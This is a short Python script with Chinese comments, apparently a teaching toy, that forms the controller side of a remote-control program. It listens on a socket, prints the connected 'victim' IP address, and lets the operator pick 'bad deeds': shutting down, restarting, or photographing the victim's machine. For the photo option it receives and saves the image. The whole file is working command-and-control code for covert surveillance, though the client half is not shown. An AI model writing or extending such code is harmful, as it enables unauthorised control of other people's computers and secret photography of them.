from socket import*    #导入网络编程模块
#1.准备一台电话机
S = socket()
#2.准备一个号码
S.bind(('0.0.0.0', 8888))
#IP地址0.0.0.0默认使用当前计算机的IP
#8888是PORT端口号 1024-65535之间
#3.电话机开启监听
S.listen()
#4.如果有号码打进来，接受，分给分机
s, addr = S.accept()
#分机， 来电显示 = 主机.接受（）
#查看受害者ip地址
print(addr)
#幕后黑手
print('1.关机 2.重启 3.拍照')
choice = input('请选择你要干的坏事编号:')
s.send(choice.encode())

if choice == '3':
    #1.接受文件的大小 回复确认！
    file_size = int(s.recv(1024).decode())
    s.send('ok'.encode())
    #2.准备一个空文件 一点一点的接收 写入新文件！
    cur_size = 0
    with open('2.png', 'wb') as file:
        while cur_size < file_size:
            data = s.recv(1024)
            file.write(data)
            cur_size += len(data)
